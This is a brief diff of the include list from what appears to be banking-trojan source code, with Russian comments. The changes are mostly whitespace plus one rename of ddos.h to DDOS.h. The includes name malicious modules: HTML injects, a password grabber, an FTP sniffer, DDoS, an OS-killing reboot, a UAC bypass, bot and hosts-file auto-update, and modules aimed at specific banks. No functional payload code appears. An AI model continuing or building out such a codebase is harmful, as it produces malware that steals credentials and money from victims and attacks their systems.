@@ -9,6 +9,7 @@
 #include "Firefox.h"
 #include "Opera.h"
 
+
 #include "KeepAlive.h"
 
 #include "BotConfig.h"     // Модуль включает HTML инжекты
@@ -18,9 +19,7 @@
 
 //#include "Exploit.h"
 
-#include "ddos.h"
-
-
+#include "DDOS.h"
 #include "Grabber.h" // Включение грабера паролей
 #include "FtpSniffer.h" // Перехват фтп трафика
 #include "coocksol.h"  // Очистка куков ИЕ и ФФ
@@ -53,6 +52,7 @@
 #include "java_patcher.h"
 
 #include "KillOs_Reboot.h"
+
 #include "BBSCBank.h"
 
 
@@ -67,12 +67,9 @@
 #include "PrivatBank.h"
 #include "tiny.h"
 
-
 #include "HostsAutoUpdate.h"
 #include "BotAutoUpdate.h"
 	
-
-
 #include "AzConfig.h"
 
 #include "Exploit\\UAC_bypass.h"
